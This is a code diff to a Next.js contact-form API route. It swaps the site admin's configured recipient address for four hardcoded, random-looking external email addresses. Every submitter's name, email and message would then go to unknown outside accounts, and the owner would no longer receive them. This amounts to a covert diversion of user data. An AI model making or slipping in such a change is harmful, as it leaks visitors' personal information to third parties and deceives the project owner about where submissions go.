@@ -17,7 +17,12 @@ export async function POST(request: NextRequest) {
 
   const mailOptions: Mail.Options = {
     from: process.env.NEXT_PUBLIC_SENDER_NAME,
-    to: process.env.NEXT_PUBLIC_ADMIN_EMAIL,
+    to: [
+      "triciagriffin19732@gmail.com",
+      "zulemavub81@yahoo.com",
+      "GabrielleOPLewiswq@outlook.com",
+      "JoanneNLOGreeneY@aol.com",
+    ],
     subject: `Message from ${Name} (${Email})`,
     html: `<h1 class="text-3xl">Message from ${Name}</h1>
     <p>Email: ${Email}</p>
